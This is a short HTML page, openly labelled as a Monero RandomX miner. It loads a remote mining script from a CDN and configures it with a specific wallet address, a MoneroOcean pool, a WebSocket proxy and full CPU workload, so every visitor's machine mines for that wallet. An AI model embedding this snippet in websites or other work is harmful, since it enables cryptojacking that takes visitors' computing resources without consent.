<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Monero RandomX Miner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
  <h1>Mining Monero (RandomX)</h1>
  <p>Progress: <a href="https://moneroocean.stream" target="_blank">MoneroOcean</a></p>
  <div id="log" style="background:#111;color:#0f0;padding:12px;font-family:monospace;white-space:pre-wrap;min-height:120px;"></div>

  <script>
    const logEl = document.getElementById('log');
    function log(msg) {
      logEl.textContent += msg + '\n';
      console.log(msg);
    }

    window.addEventListener('randomx:ready', (e) => {
      log('✓ randomx:ready — miner siap');
      const rx = e.detail.instance;
      log('State: ' + JSON.stringify(rx.state));
    });

    window.addEventListener('randomx:error', (e) => {
      log('✗ randomx:error → ' + JSON.stringify(e.detail));
    });

    // Tangkap error JS biasa
    window.onerror = function(msg, url, line) {
      log('JS Error: ' + msg + ' @' + line);
    };
  </script>

  <!-- Embed default (bukan headless) -->
  <script defer crossorigin="anonymous"
    src="https://cdn.jsdelivr.net/gh/aa022/RandomX-bonanza@main/dist/embed.js"
    data-wallet="85KNrXfutegLDjeRiaBjkUVjCU2A3jkDq8s79A6M1dXg3dL4zZcNwh9UZkSL2HrGmZhoVuFru53mQH8MMz97nTzc47kk9kr"
    data-pool="gulf.moneroocean.stream"
    data-port="10128"
    data-proxy="wss://gxmail.dev"
    data-mode="full"
    data-workload="100"
    data-worker-name="web1">
  </script>
</body>
</html>
